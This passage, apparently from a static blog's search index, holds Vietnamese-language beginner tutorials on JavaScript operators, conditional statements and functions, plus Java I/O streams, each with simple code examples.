\u0026gt; \u0026#34;B\u0026#34;); // -\u0026gt; true console.log(\u0026#34;B\u0026#34; \u0026gt; \u0026#34;A\u0026#34;); // -\u0026gt; true console.log(\u0026#34;A\u0026#34; \u0026gt; \u0026#34;4\u0026#34;); // -\u0026gt; true console.log(\u0026#34;4\u0026#34; \u0026gt; \u0026#34;1\u0026#34;); // -\u0026gt; true console.log(\u0026#34;ab1\u0026#34; \u0026lt; \u0026#34;ab4\u0026#34;); // -\u0026gt; true console.log(\u0026#34;ab4\u0026#34; \u0026lt; \u0026#34;abA\u0026#34;); // -\u0026gt; true console.log(\u0026#34;abB\u0026#34; \u0026lt; \u0026#34;aba\u0026#34;); // -\u0026gt; true console.log(\u0026#34;aba\u0026#34; \u0026lt; \u0026#34;abb\u0026#34;); // -\u0026gt; true console.log(\u0026#34;ab\u0026#34; \u0026lt; \u0026#34;ab4\u0026#34;); // -\u0026gt; true Lưu ý: biểu tượng =\u0026gt; tồn tại trong JavaScript, nhưng không phải là toán tử -- chúng ta sử dụng nó trong quá trình xây dựng các hàm mũi tên.\n2.3 Các nhà điều hành khác #Danh sách các toán tử trong JavaScript dài hơn nhiều, nhưng nhiều toán tử trong số đó sẽ không thực sự hữu ích ở giai đoạn học này, chẳng hạn như các toán tử bitwise, hoạt động trên các bit đơn lẻ của toán hạng. Tuy nhiên, cũng đáng đề cập đến một vài toán tử khác, một số đã xuất hiện trong các ví dụ trước.\n2.3.1 typeof #Chúng tôi đã giới thiệuloại củaToán tử này khi thảo luận về kiểu dữ liệu. Đây là toán tử một ngôi, kiểm tra kiểu toán hạng (có thể là biến hoặc số nguyên). Toán tử trả về một chuỗi có tên kiểu, chẳng hạn như \u0026ldquo;boolean\u0026rdquo; hoặc \u0026ldquo;number\u0026rdquo;.\nNếu bạn muốn làm mới kiến ​​thức về toán tử này, hãy quay lại phần về kiểu dữ liệu.\nlet year = 10191; console.log(*typeof* year); // -\u0026gt; number\\* console.log(*typeof* false); // -\u0026gt; boolean\\* 2.3.2 instanceof #Các trường hợp củaToán tử này xuất hiện khi thảo luận về mảng. Đây là toán tử nhị phân kiểm tra xem một đối tượng (toán hạng trái) có thuộc kiểu nào đó (toán hạng phải) hay không. Tùy thuộc vào kết quả kiểm tra, nó trả về true hoặc false.\nTrong khóa học này, tính hữu ích của toán tử này chỉ giới hạn ở việc kiểm tra xem một biến có chứa mảng hay không.\nlet names = [\u0026#34;Patti\u0026#34;, \u0026#34;Bob\u0026#34;]; let name = names[0]; console.log(names instanceof Array); // -\u0026gt; true console.log(name instanceof Array); // -\u0026gt; false 2.3.3 delete #Đơn vị delete Toán tử này được giới thiệu khi thảo luận về các đối tượng. Nó cho phép bạn xóa một trường đã chọn của đối tượng có tên được chỉ định bằng một toán hạng.\nlet user = { name: \u0026#34;Alice\u0026#34;, age: 38, }; console.log(user.age); // -\u0026gt; 38 delete user.age; console.log(user.age); // -\u0026gt; undefined 2.3.4 toán tử 3 ngôi #Toán tử cuối cùng được thảo luận khá bất thường, vì đây là toán tử duy nhất sử dụng ba toán hạng. Đây là một toán tử điều kiện. Dựa trên giá trị của toán hạng thứ nhất (true hoặc false), giá trị của toán hạng thứ hai hoặc thứ ba tương ứng sẽ được trả về. Toán tử này thường được sử dụng để đặt một trong hai giá trị vào biến tùy thuộc vào một điều kiện nhất định. Chúng ta sẽ quay lại toán tử này khi thảo luận về toán tử if có điều kiện, nhưng ở đây chúng tôi chỉ cung cấp một ví dụ đơn giản về cách sử dụng của nó. Ba toán hạng được phân tách với nhau bằng ? (toán hạng thứ nhất cách xa toán hạng thứ hai) và : (toán hạng thứ hai cách xa toán hạng thứ ba).\nconsole.log(true ? \u0026#34;Alice\u0026#34; : \u0026#34;Bob\u0026#34;); // -\u0026gt; Alice console.log(false ? \u0026#34;Alice\u0026#34; : \u0026#34;Bob\u0026#34;); // -\u0026gt; Bob Mỗi toán hạng này có thể là một biểu thức cần được tính toán. Trong ví dụ sau, toán hạng đầu tiên là phép so sánh hai số bằng toán tử so sánh. Kết quả của phép so sánh sẽ là false, và toán tử điều kiện (ba ngôi) sẽ sử dụng kết quả này. Ở đây, chúng ta sẽ đi sâu vào một vấn đề quan trọng về thứ tự thực hiện và thứ tự ưu tiên của toán tử. Chúng ta sẽ tìm hiểu thêm về vấn đề này sau.\nlet name = 1 \u0026gt; 2 ? \u0026#34;Alice\u0026#34; : \u0026#34;Bob\u0026#34;; console.log(name); // -\u0026gt; Bob ","date":"15 October 2025","permalink":"http://localhost:1313/posts/toan-tu/","section":"Posts","summary":"","title":"Toán tử và so sánh chuỗi"},{"content":"Stream trong Java giống như những con sông chở dữ liệu trong máy tính. Dữ liệu (như file ảnh, văn bản, số liệu) được \u0026ldquo;chở\u0026rdquo; từ nơi này (ví dụ: ổ cứng) đến nơi khác (ví dụ: file mới hoặc màn hình). Stream giúp chúng ta đọc (lấy nước từ sông) hoặc ghi (đổ nước vào sông) dữ liệu. Hãy tưởng tượng tôi đang giải thích cho một người bạn chưa biết gì về lập trình, dùng ngôn ngữ đơn giản và ví dụ đời thường.\n1. Byte Stream: Chở hàng thô #Hình ảnh đời thường: Tưởng tượng bạn copy file nhạc MP3 hoặc ảnh JPEG từ USB sang máy tính. Bạn không cần biết trong file có gì, chỉ chép nguyên xi từng mẩu nhỏ (gọi là byte, như từng viên gạch). Đó là Byte Stream.\nGiải thích đơn giản:\nByte Stream chở dữ liệu dưới dạng byte (8 bit, như mã số nhỏ). Dùng cho dữ liệu nhị phân: ảnh, video, nhạc, file PDF. Giống xe tải chở hàng thô, không quan tâm bên trong là gì. Ví dụ đời thường: Copy file ảnh \u0026ldquo;cat.jpg\u0026rdquo; từ máy sang USB. Byte Stream lấy từng mẩu nhỏ của ảnh và chép sang.\nVí dụ code Java:\nimport java.io.FileInputStream; import java.io.FileOutputStream; import java.io.IOException; public class ByteStreamExample { public static void main(String[] args) { try { FileInputStream fis = new FileInputStream(\u0026#34;cat.jpg\u0026#34;); // Mở \u0026#34;sông\u0026#34; đọc từ file ảnh FileOutputStream fos = new FileOutputStream(\u0026#34;copy_cat.jpg\u0026#34;); // Mở \u0026#34;sông\u0026#34; ghi ra file mới int byteData; while ((byteData = fis.read()) != -1) { // Đọc từng byte fos.write(byteData); // Ghi byte đó ra } fis.close(); fos.close(); System.out.println(\u0026#34;Đã chép ảnh xong!\u0026#34;); } catch (IOException e) { System.out.println(\u0026#34;Có lỗi xảy ra: \u0026#34; + e.getMessage()); } } } Tại sao chậm? Đọc từng byte giống như bê từng viên gạch – đúng nhưng mất thời gian.\n2. Character Stream: Chở chữ cái #Hình ảnh đời thường: Bạn mở file \u0026ldquo;note.txt\u0026rdquo; chứa câu \u0026ldquo;Xin chào\u0026rdquo;. Nếu dùng Byte Stream, bạn thấy số (như 88, 105 – mã ASCII/UTF-8). Character Stream giống người dịch, biến số thành chữ \u0026ldquo;Xin chào\u0026rdquo; để bạn đọc dễ dàng.\nGiải thích đơn giản:\nCharacter Stream chở ký tự (như chữ A, B, hoặc \u0026ldquo;ă\u0026rdquo;, \u0026ldquo;ế\u0026rdquo;). Tự động dịch byte thành ký tự theo bảng mã (như UTF-8). Dùng cho file văn bản: .txt, .java, .html. Ví dụ đời thường: Copy file \u0026ldquo;note.txt\u0026rdquo; chứa \u0026ldquo;Xin chào\u0026rdquo; sang file mới. Character Stream chép đúng chữ, không lo mã số.\nVí dụ code Java:\nimport java.io.FileReader; import java.io.FileWriter; import java.io.IOException; public class CharacterStreamExample { public static void main(String[] args) { try { FileReader fr = new FileReader(\u0026#34;note.txt\u0026#34;); // Mở \u0026#34;sông\u0026#34; đọc chữ FileWriter fw = new FileWriter(\u0026#34;copy_note.txt\u0026#34;); // Mở \u0026#34;sông\u0026#34; ghi chữ int charData; while ((charData = fr.read()) != -1) { // Đọc từng ký tự fw.write(charData); // Ghi ký tự đó ra } fr.close(); fw.close(); System.out.println(\u0026#34;Đã chép file text xong!\u0026#34;); } catch (IOException e) { System.out.println(\u0026#34;Có lỗi xảy ra: \u0026#34; + e.getMessage()); } } } Tại sao tiện? Bạn không cần tự dịch mã số thành chữ – Character Stream làm sẵn.\n3. Buffered Stream: Xe tải lớn thay vì xe máy #Hình ảnh đời thường: Thay vì bê từng viên gạch (Byte Stream) hoặc từng chữ (Character Stream), bạn dùng xe tải lớn chở cả đống cùng lúc. Buffered Stream giống xe tải: gom dữ liệu vào thùng lớn (buffer) trước khi chở, nên nhanh hơn.\nGiải thích đơn giản:\nBuffered Stream thêm bộ đệm để gom dữ liệu trước khi đọc/ghi. Giảm số lần máy tính làm việc với ổ cứng, nên nhanh hơn. Dùng được với cả Byte Stream và Character Stream. Ví dụ đời thường: Copy file ảnh \u0026ldquo;cat.jpg\u0026rdquo; bằng xe tải chở 1MB mỗi lần, hoặc copy \u0026ldquo;note.txt\u0026rdquo; từng câu thay vì từng chữ.\nVí dụ code Java (cho text):\nimport java.io.BufferedReader; import java.io.BufferedWriter; import java.io.FileReader; import java.io.FileWriter; import java.io.IOException; public class BufferedStreamExample { public static void main(String[] args) { try { BufferedReader br = new BufferedReader(new FileReader(\u0026#34;note.txt\u0026#34;)); // Đọc chữ với buffer BufferedWriter bw = new BufferedWriter(new FileWriter(\u0026#34;copy_note.txt\u0026#34;)); // Ghi chữ với buffer String line; while ((line = br.readLine()) != null) { // Đọc cả dòng bw.write(line); // Ghi cả dòng bw.newLine(); // Thêm dòng mới } br.close(); bw.close(); System.out.println(\u0026#34;Đã chép file text nhanh hơn!\u0026#34;); } catch (IOException e) { System.out.println(\u0026#34;Có lỗi xảy ra: \u0026#34; + e.getMessage()); } } } Tại sao nhanh? Chở cả xe tải thay vì đi lại từng lần, tiết kiệm thời gian.\n4. Data Stream: Ghi nhãn hàng hóa #Hình ảnh đời thường: Bạn gửi gói hàng chứa số 100, số 3.14, và chữ \u0026ldquo;Xin chào\u0026rdquo;. Nếu dùng Byte Stream, người nhận chỉ thấy byte thô, không biết cái nào là số, cái nào là chữ. Data Stream giống như ghi nhãn: \u0026ldquo;Đây là số nguyên 100\u0026rdquo;, \u0026ldquo;Đây là số thập phân 3.14\u0026rdquo;, \u0026ldquo;Đây là chữ Xin chào\u0026rdquo;. Khi nhận, mở đúng thứ tự và loại.\nGiải thích đơn giản:\nData Stream ghi/đọc dữ liệu nguyên thủy (int, double, boolean) và String. Đảm bảo dữ liệu giữ đúng kiểu và thứ tự khi đọc lại. Dùng cho mạng hoặc lưu số liệu vào file. Ví dụ đời thường: Lưu điểm số học sinh (90, 8.5, true, \u0026ldquo;Tèo\u0026rdquo;) vào file, sau này mở ra vẫn đúng kiểu.\nVí dụ code Java:\nimport java.io.DataInputStream; import java.io.DataOutputStream; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.IOException; public class DataStreamExample { public static void main(String[] args) { // Ghi dữ liệu try { DataOutputStream dos = new DataOutputStream(new FileOutputStream(\u0026#34;data.txt\u0026#34;)); dos.writeInt(90); // Ghi số nguyên dos.writeDouble(8.5); // Ghi số thập phân dos.writeBoolean(true); // Ghi true/false dos.writeUTF(\u0026#34;Tèo\u0026#34;); // Ghi chuỗi dos.close(); System.out.println(\u0026#34;Đã ghi dữ liệu!\u0026#34;); } catch (IOException e) { System.out.println(\u0026#34;Lỗi khi ghi: \u0026#34; + e.getMessage()); } // Đọc dữ liệu try { DataInputStream dis = new DataInputStream(new FileInputStream(\u0026#34;data.txt\u0026#34;)); int score = dis.readInt(); // Đọc số nguyên double grade = dis.readDouble(); // Đọc số thập phân boolean passed = dis.readBoolean(); // Đọc true/false String name = dis.readUTF(); // Đọc chuỗi System.out.println(\u0026#34;Điểm: \u0026#34; + score); System.out.println(\u0026#34;Điểm thập phân: \u0026#34; + grade); System.out.println(\u0026#34;Đậu: \u0026#34; + passed); System.out.println(\u0026#34;Tên: \u0026#34; + name); dis.close(); } catch (IOException e) { System.out.println(\u0026#34;Lỗi khi đọc: \u0026#34; + e.getMessage()); } } } Tại sao hữu ích? Không cần tự dịch byte thành số/chữ – Data Stream làm sẵn và đảm bảo đúng.\n5. InputStream: Ống hút chung #Hình ảnh đời thường: InputStream là ống hút lớn để hút nước (byte) từ bất kỳ nguồn nào (file, mạng, bàn phím). Nhưng nó chỉ hút byte thô, cần thêm phụ kiện (như BufferedInputStream để hút nhanh, hoặc DataInputStream để hiểu dữ liệu).\nGiải thích đơn giản:\nInputStream là cha của mọi ống hút đọc byte. Chỉ định nghĩa cách hút (read()), không xử lý dữ liệu. Các con: FileInputStream (đọc file), BufferedInputStream (đọc nhanh). Ví dụ đời thường: Hút nước từ chai (file) bằng ống hút chung, nhưng cần bộ lọc để hút nhanh hoặc hiểu nước là gì.\nVí dụ code Java:\nimport java.io.FileInputStream; import java.io.IOException; public class InputStreamExample { public static void main(String[] args) { try { FileInputStream fis = new FileInputStream(\u0026#34;cat.jpg\u0026#34;); System.out.println(\u0026#34;Có \u0026#34; + fis.available() + \u0026#34; byte để đọc!\u0026#34;); fis.close(); } catch (IOException e) { System.out.println(\u0026#34;Lỗi: \u0026#34; + e.getMessage()); } } } 6. OutputStream: Ống xả chung #Hình ảnh đời thường: OutputStream là ống xả nước ra ngoài (file, màn hình, mạng). Nó chỉ xả byte thô, cần thêm phụ kiện để xả nhanh hoặc đúng định dạng.\nGiải thích đơn giản:\nOutputStream là cha của mọi ống xả ghi byte. Các con: FileOutputStream (ghi file), BufferedOutputStream (ghi nhanh). Ví dụ đời thường: Đổ nước (dữ liệu) ra chai (file) bằng ống xả chung, cần bộ lọc để đổ nhanh hoặc đúng cách.\nVí dụ code Java:\nimport java.io.FileOutputStream; import java.io.IOException; public class OutputStreamExample { public static void main(String[] args) { try { FileOutputStream fos = new FileOutputStream(\u0026#34;hello.txt\u0026#34;); String message = \u0026#34;Xin chào!\u0026#34;; fos.write(message.getBytes()); // Ghi byte của chuỗi fos.close(); System.out.println(\u0026#34;Đã ghi file!\u0026#34;); } catch (IOException e) { System.out.println(\u0026#34;Lỗi: \u0026#34; + e.getMessage()); } } } Bức Tranh Tổng Thể #Hãy tưởng tượng bạn vận chuyển hàng (dữ liệu) từ kho (file, mạng) đến cửa hàng (file, màn hình):\nByte Stream: Chở hàng thô (ảnh, video) từng viên gạch. Character Stream: Chở chữ cái (text) đã dịch sẵn. Buffered Stream: Dùng xe tải lớn để chở nhanh. Data Stream: Ghi nhãn số, chữ để không nhầm. InputStream/OutputStream: Ống hút/xả chung, cần thêm phụ kiện để hiệu quả. Flowchart đơn giản (ASCII art):\n[ Kho: file, mạng ] --\u0026gt; InputStream --\u0026gt; [ BufferedInputStream --\u0026gt; DataInputStream ]\r| (đọc nhanh) | (đọc số/chữ)\rv\r[ Xử lý dữ liệu ]\r|\rv\r[ Cửa hàng: file, màn hình ] \u0026lt;-- OutputStream \u0026lt;-- [ BufferedOutputStream \u0026lt;-- DataOutputStream ]\r(ghi nhanh) (ghi số/chữ) Giải thích flowchart:\nDữ liệu từ kho đi qua InputStream (ống hút). Thêm BufferedInputStream (xe tải) để nhanh, hoặc DataInputStream để hiểu dữ liệu. Sau xử lý, dữ liệu qua OutputStream (ống xả) ra cửa hàng. Các stream chồng lên nhau như bọc thêm lớp để tăng tính năng. Tóm Tắt Siêu Đơn Giản # Loại Stream Dùng Cho Gì? Ví Dụ Đời Thường Byte Stream Chép ảnh, video, không hiểu nội dung Copy file \u0026ldquo;cat.jpg\u0026rdquo; Character Stream Chép text, tự dịch chữ Copy file \u0026ldquo;note.txt\u0026rdquo; Buffered Stream Chở xe tải cho nhanh Copy file lớn nhanh hơn Data Stream Ghi nhãn số, chữ để đúng Lưu điểm số học sinh InputStream Ống hút chung cho byte Đọc file ảnh OutputStream Ống xả chung cho byte Ghi text ra file ","date":"14 October 2025","permalink":"http://localhost:1313/posts/luong-du-lieu/","section":"Posts","summary":"","title":" Hiểu Biết Các Loại Stream"},{"content":"Câu lệnh điều kiện (conditional statements) giúp chương trình đưa ra quyết định, thực thi các nhánh code khác nhau dựa trên điều kiện đúng (true) hoặc sai (false). Bài viết này trình bày các loại câu lệnh điều kiện trong JavaScript, bao gồm ### Cú pháp, ví dụ minh họa, và sơ đồ luồng.\n1. Câu lệnh có điều kiện là gì? #Câu lệnh điều kiện cho phép chương trình quyết định thực thi đoạn code nào dựa trên giá trị true hoặc false của biểu thức điều kiện.\nNếu biểu thức trả về true: Thực thi đoạn code trong khối điều kiện. Nếu biểu thức trả về false: Bỏ qua hoặc thực thi nhánh khác (nếu có). Ví dụ #let age = 20; if (age \u0026gt;= 18) { console.log(\u0026#34;Bạn đã đủ tuổi trưởng thành.\u0026#34;); } Kết quả:\nBạn đã đủ tuổi trưởng thành. Sơ đồ luồng (flowchart):\n[Bắt đầu]\r|\r[age \u0026gt;= 18?]____________\r| |\rTrue False\r| |\r[In: \u0026#34;Bạn đã...]_______[Kết thúc] 2. Boolean, Truthy và Falsy #Trong JavaScript, mọi giá trị đều được ép kiểu về true hoặc false khi đánh giá trong điều kiện.\nFalsy (sai): false, 0, \u0026quot;\u0026quot; (chuỗi rỗng), null, undefined, NaN. Truthy (đúng): Tất cả các giá trị khác, ví dụ: \u0026quot;hello\u0026quot;, 123, [], {}. Ví dụ #if (\u0026#34;hello\u0026#34;) { console.log(\u0026#34;Chuỗi không rỗng → truthy → in ra\u0026#34;); } if (0) { console.log(\u0026#34;Không chạy vì 0 là falsy\u0026#34;); } Kết quả:\nChuỗi không rỗng → truthy → in ra 3. Câu lệnh if #\rThực thi khối code nếu điều kiện trả về true.\nCú pháp #if (điều_kiện) { // Code thực thi nếu điều_kiện == true } Ví dụ #let temperature = 35; if (temperature \u0026gt; 30) { console.log(\u0026#34;Trời nóng, nhớ uống nhiều nước!\u0026#34;); } Kết quả:\nTrời nóng, nhớ uống nhiều nước! Sơ đồ luồng:\n[Bắt đầu]\r|\r[temperature \u0026gt; 30?]______________\r| |\rTrue False\r| |\r[In: \u0026#34;Trời nóng...\u0026#34;]_________[Kết thúc] 4. Câu lệnh if ... else #\rThực thi một khối code nếu điều kiện true, hoặc khối khác nếu false.\nCú pháp #if (điều_kiện) { // Code thực thi nếu điều_kiện == true } else { // Code thực thi nếu điều_kiện == false } Ví dụ #let hour = 10; if (hour \u0026lt; 12) { console.log(\u0026#34;Chào buổi sáng!\u0026#34;); } else { console.log(\u0026#34;Chào buổi chiều!\u0026#34;); } Kết quả:\nChào buổi sáng! Sơ đồ luồng:\n[Bắt đầu]\r|\r[hour \u0026lt; 12?] _____________________\r| |\rTrue False\r| |\r[In: \u0026#34;Chào buổi sáng!\u0026#34;] [In: \u0026#34;Chào buổi chiều!\u0026#34;]\r| |\r|____________[Kết thúc]______| 5. Câu lệnh if ... else if #\rDùng khi cần kiểm tra nhiều điều kiện liên tiếp.\nCú pháp #if (điều_kiện_1) { // Code thực thi nếu điều_kiện_1 == true } else if (điều_kiện_2) { // Code thực thi nếu điều_kiện_2 == true } else { // Code thực thi nếu tất cả điều kiện đều false } Ví dụ #let score = 85; if (score \u0026gt;= 90) { console.log(\u0026#34;Xuất sắc\u0026#34;); } else if (score \u0026gt;= 75) { console.log(\u0026#34;Khá\u0026#34;); } else if (score \u0026gt;= 50) { console.log(\u0026#34;Trung bình\u0026#34;); } else { console.log(\u0026#34;Yếu\u0026#34;); } Kết quả:\nKhá Sơ đồ luồng:\n[Bắt đầu]\r|\r[score \u0026gt;= 90?]____\r| |\rTrue False\r| |\r[In: \u0026#34;Xuất sắc\u0026#34;] [score \u0026gt;= 75?]____\r| | |\r| True False\r| | |\r| [In: \u0026#34;Khá\u0026#34;] [score \u0026gt;= 50?]___________\r| | | |\r| | True False\r| | | |\r| | [In: \u0026#34;Trung bình\u0026#34;] [In: \u0026#34;Yếu\u0026#34;]\r| | | |\r|______________|____________[Kết thúc]__________| 6. Toán tử ba ngôi #\rToán tử ba ngôi (?:) là cách viết ngắn gọn cho if ... else.\nCú pháp #điều_kiện ? giá_trị_nếu_true : giá_trị_nếu_false; Ví dụ #let age = 17; let message = age \u0026gt;= 18 ? \u0026#34;Được phép lái xe\u0026#34; : \u0026#34;Chưa đủ tuổi lái xe\u0026#34;; console.log(message); Kết quả:\nChưa đủ tuổi lái xe Sơ đồ luồng:\n[Bắt đầu]\r|\r[age \u0026gt;= 18?]________________\r| |\rTrue False\r| |\r[message = \u0026#34;Được phép...\u0026#34;] [message = \u0026#34;Chưa đủ...\u0026#34;]\r| |\r[In: message]______________|\r|\r[Kết thúc] 7. Câu lệnh switch ... case #\rDùng để kiểm tra một biến với nhiều giá trị cụ thể, gọn gàng hơn khi có nhiều nhánh.\nCú pháp #switch (biểu_thức) { case giá_trị_1: // Code thực thi nếu biểu_thức == giá_trị_1 break; case giá_trị_2: // Code thực thi nếu biểu_thức == giá_trị_2 break; default: // Code thực thi nếu không khớp giá trị nào } Ví dụ #let day = 3; switch (day) { case 1: console.log(\u0026#34;Thứ Hai\u0026#34;); break; case 2: console.log(\u0026#34;Thứ Ba\u0026#34;); break; case 3: console.log(\u0026#34;Thứ Tư\u0026#34;); break; case 4: console.log(\u0026#34;Thứ Năm\u0026#34;); break; case 5: console.log(\u0026#34;Thứ Sáu\u0026#34;); break; default: console.log(\u0026#34;Cuối tuần\u0026#34;); } Kết quả:\nThứ Tư Sơ đồ luồng:\n[Bắt đầu]\r|\r[day = ?]____________________________\r| | | ...... |\r1 2 3 default\r| | |\r[In: \u0026#34;Thứ Hai\u0026#34;] [In: \u0026#34;Thứ Tư\u0026#34;] [In: \u0026#34;Cuối tuần\u0026#34;]\r| | |\r[break]____________[break]______[Kết thúc] Chú ý: Nếu thiếu break, chương trình sẽ tiếp tục thực thi các case tiếp theo (hiện tượng fall-through).\n8. So sánh if ... else if và switch ... case # Tiêu chí if \u0026hellip; else if switch \u0026hellip; case Điều kiện So sánh phức tạp (\u0026gt;, \u0026lt;, \u0026gt;=, \u0026hellip;) So sánh giá trị rời rạc (===) Độ dài code Có thể dài, khó đọc nếu nhiều nhánh Gọn gàng khi kiểm tra nhiều giá trị cụ thể Hiệu suất Tương đương (JS engine tối ưu tốt) Không khác biệt đáng kể ","date":"14 October 2025","permalink":"http://localhost:1313/posts/cau-lenh-dieu-kien/","section":"Posts","summary":"","title":"Câu Lệnh Điều Kiện"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/closures/","section":"Tags","summary":"","title":"Closures"},{"content":"","date":null,"permalink":"http://localhost:1313/categories/c%C6%A1-b%E1%BA%A3n/","section":"Categories","summary":"","title":"Cơ Bản"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/c%C6%A1-b%E1%BA%A3n/","section":"Tags","summary":"","title":"Cơ Bản"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/design-patterns/","section":"Tags","summary":"","title":"Design Patterns"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/feynman/","section":"Tags","summary":"","title":"Feynman"},{"content":"\rMục lục # Hàm là gì? Tại sao sử dụng hàm? Khai báo hàm Gọi hàm Biến cục bộ trong hàm Câu lệnh return Tham số (Parameters) Shadowing Kiểm tra tham số (Parameters Validation) Đệ quy (Recursion) Hàm như thành viên hạng nhất (First-class Citizens) Biểu thức hàm (Function Expressions) Callbacks Callbacks bất đồng bộ (Asynchronous Callbacks) setTimeout và setInterval Arrow Functions Kết luận và mẹo sử dụng Tài liệu tham khảo 1. Hàm là gì? #\rHàm (function) trong JavaScript là một khối mã nguồn độc lập, tạo thành một đơn vị logic khép kín, được thiết kế để thực hiện một nhiệm vụ cụ thể. Bạn có thể hình dung hàm như một \u0026ldquo;cỗ máy\u0026rdquo; nhỏ nhận đầu vào (nếu có), xử lý logic bên trong, và trả về đầu ra (nếu cần). Hàm có thể được gọi nhiều lần ở các vị trí khác nhau trong chương trình, giúp tái sử dụng mã hiệu quả.\nTên hàm: Thường được đặt để dễ nhận biết, nhưng cũng có thể là hàm ẩn danh (anonymous) không có tên, thường dùng cho các tác vụ một lần. Ví dụ đơn giản: Hàm tính tổng hai số hoặc hàm hiển thị thông báo chào hỏi. Tính linh hoạt: Hàm có thể nhận tham số, trả về giá trị, hoặc chỉ thực thi tác vụ (như in ra console). Ví dụ minh họa: Hãy tưởng tượng bạn đang xây dựng một ứng dụng quản lý kho hàng. Thay vì viết lại công thức tính giá trị tồn kho (số lượng * giá đơn vị) nhiều lần, bạn có thể đóng gói nó vào một hàm và gọi khi cần.\n2. Tại sao sử dụng hàm? #Sử dụng hàm mang lại nhiều lợi ích thiết thực, đặc biệt trong các dự án lớn:\nMô-đun hóa (Modularity): Chia chương trình thành các phần nhỏ, độc lập, giúp mã dễ đọc, dễ bảo trì, và dễ debug. Ví dụ, một ứng dụng web có thể có hàm riêng để xử lý đăng nhập, hiển thị sản phẩm, hoặc tính tổng giỏ hàng.\nTái sử dụng mã (Reusability): Tránh lặp lại code (DRY - Don\u0026rsquo;t Repeat Yourself). Một đoạn code được dùng nhiều nơi nên được đóng gói thành hàm, chỉ cần sửa một chỗ khi cần thay đổi.\nKiểm tra dễ dàng (Testability): Hàm độc lập có thể được kiểm tra riêng lẻ (unit test) mà không cần chạy toàn bộ chương trình.\nTăng tính trừu tượng: Ẩn chi tiết triển khai, chỉ lộ giao diện qua tham số và giá trị trả về, giúp mã dễ hiểu hơn.\nVí dụ thực tế: Tính trung bình nhiệt độ từ 24 phép đo mỗi ngày.\nKhông dùng hàm:\nlet temperatures = [ 12, 12, 11, 11, 10, 9, 9, 10, 12, 13, 15, 18, 21, 24, 24, 23, 25, 25, 23, 21, 20, 19, 17, 16, ]; let sum = 0; for (let i = 0; i \u0026lt; temperatures.length; i++) { sum += temperatures[i]; } let meanTemp = sum / temperatures.length; console.log(`Trung bình ngày 1: ${meanTemp}`); // Lặp lại cho ngày 2 temperatures = [ 17, 16, 14, 12, 10, 10, 10, 11, 13, 14, 15, 17, 22, 27, 29, 29, 27, 26, 24, 21, 19, 18, 17, 16, ]; sum = 0; for (let i = 0; i \u0026lt; temperatures.length; i++) { sum += temperatures[i]; } meanTemp = sum / temperatures.length; console.log(`Trung bình ngày 2: ${meanTemp}`); Có hàm:\nfunction tinhTrungBinh(temps) { let sum = 0; for (let i = 0; i \u0026lt; temps.length; i++) { sum += temps[i]; } return sum / temps.length; } let day1 = [ 12, 12, 11, 11, 10, 9, 9, 10, 12, 13, 15, 18, 21, 24, 24, 23, 25, 25, 23, 21, 20, 19, 17, 16, ]; console.log(`Trung bình ngày 1: ${tinhTrungBinh(day1)}`); // 16.666666666666668 let day2 = [ 17, 16, 14, 12, 10, 10, 10, 11, 13, 14, 15, 17, 22, 27, 29, 29, 27, 26, 24, 21, 19, 18, 17, 16, ]; console.log(`Trung bình ngày 2: ${tinhTrungBinh(day2)}`); // 18.083333333333332 Trường hợp liên tưởng:\nTrong ứng dụng game, hàm updateScore(score, points) có thể được gọi ở nhiều level để cập nhật điểm. Trong website, hàm formatCurrency(amount) định dạng tiền tệ (VD: 1000 -\u0026gt; 1,000 VNĐ) được dùng ở giỏ hàng, thanh toán, và lịch sử giao dịch. 3. Khai báo hàm #Hàm được khai báo bằng function statement với cú pháp:\nfunction tenHam(thamSo1, thamSo2, ...) { // Thân hàm: Các lệnh JavaScript // Có thể return giá trị } Tên hàm: Phải tuân theo quy tắc đặt tên biến (không bắt đầu bằng số, không chứa ký tự đặc biệt trừ _ và $). Nên đặt tên có ý nghĩa (VD: tinhTong thay vì fn1). Tham số: Tùy chọn, liệt kê trong (), cách nhau bằng dấu phẩy. Thân hàm: Khối mã {} chứa các lệnh thực thi. Hoisting: Khai báo hàm được \u0026ldquo;nâng\u0026rdquo; lên đầu scope, cho phép gọi trước khi khai báo. Ví dụ cơ bản:\nfunction chaoHoi(ten) { console.log(`Xin chào, ${ten}!`); } chaoHoi(\u0026#34;Alice\u0026#34;); // -\u0026gt; Xin chào, Alice! Ví dụ với hoisting:\nchaoHoi(\u0026#34;Bob\u0026#34;); // Hoạt động bình thường! function chaoHoi(ten) { console.log(`Xin chào, ${ten}!`); } Trường hợp khác:\nHàm tính diện tích hình vuông: function dienTichHinhVuong(canh) { return canh * canh; } console.log(dienTichHinhVuong(5)); // -\u0026gt; 25 Hàm không tham số: function thongBao() { console.log(\u0026#34;Hệ thống đang bảo trì...\u0026#34;); } thongBao(); Lưu ý: Đặt khai báo hàm ở đầu file để tăng tính đọc, dù hoisting cho phép gọi trước.\n4. Gọi hàm #Để chạy hàm, gọi bằng tên hàm theo sau dấu ngoặc () (có thể kèm đối số).\nVí dụ:\nchaoHoi(\u0026#34;Eve\u0026#34;); // -\u0026gt; Xin chào, Eve! Không đối số: Chỉ cần tenHam(). Có đối số: Đối số phải khớp thứ tự tham số trong khai báo. Gọi nhiều lần: Có thể gọi trong vòng lặp, sự kiện, hoặc hàm khác. Ví dụ trong vòng lặp:\nfunction inSoChan(n) { console.log(`Số chẵn: ${n * 2}`); } for (let i = 1; i \u0026lt;= 5; i++) { inSoChan(i); // In: Số chẵn: 2, 4, 6, 8, 10 } Ví dụ thực tế:\nHàm tính trung bình nhiệt độ (đã tối ưu):\nfunction tinhTrungBinh(temps) { let sum = 0; for (let i = 0; i \u0026lt; temps.length; i++) { sum += temps[i]; } return sum / temps.length; } let day1 = [ 12, 12, 11, 11, 10, 9, 9, 10, 12, 13, 15, 18, 21, 24, 24, 23, 25, 25, 23, 21, 20, 19, 17, 16, ]; console.log(`Trung bình ngày 1: ${tinhTrungBinh(day1)}`); let day2 = [ 17, 16, 14, 12, 10, 10, 10, 11, 13, 14, 15, 17, 22, 27, 29, 29, 27, 26, 24, 21, 19, 18, 17, 16, ]; console.log(`Trung bình ngày 2: ${tinhTrungBinh(day2)}`); Trường hợp liên tưởng:\nGọi hàm sendNotification() khi người dùng nhấn nút trong ứng dụng. Gọi hàm 